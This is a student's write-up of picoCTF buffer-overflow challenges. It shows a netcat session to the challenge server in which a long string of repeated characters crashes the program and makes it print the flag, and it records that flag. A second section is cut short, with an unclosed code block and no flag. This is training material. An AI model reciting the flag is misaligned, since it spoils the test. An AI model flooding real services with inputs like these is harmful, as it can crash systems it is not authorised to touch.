As the challenge suggested, I opened the source file to see that the first function was something known as "sigsegv_handler" and it printed the flag upon a segmentation error.

```bash
snmvarun@DESKTOP-16J7ALL:/mnt/d/Cryptonite/PicoCTF$ nc saturn.picoctf.net 49249
Input: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```
So then I ran the nc command given in the challenge and spammed it with characters and overflowed it to get the flag 

## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Concepts learnt:

- What is buffer overflow
- How to make segmentation error by overflowing.

## Notes:

- nc command is netcat command for reading from and writing to network connections using TCP or UDP.

Similar to the first challenge, there is another sigsegv function that requires overflow to print the flag

```bash
snmvarun@DESKTOP-16J7ALL:/mnt/d/Cryptonite/PicoCTF$ nc mimas.picoctf.net 64212

I spam it with characters to overflow the input and get the flag.

## Flag:

```
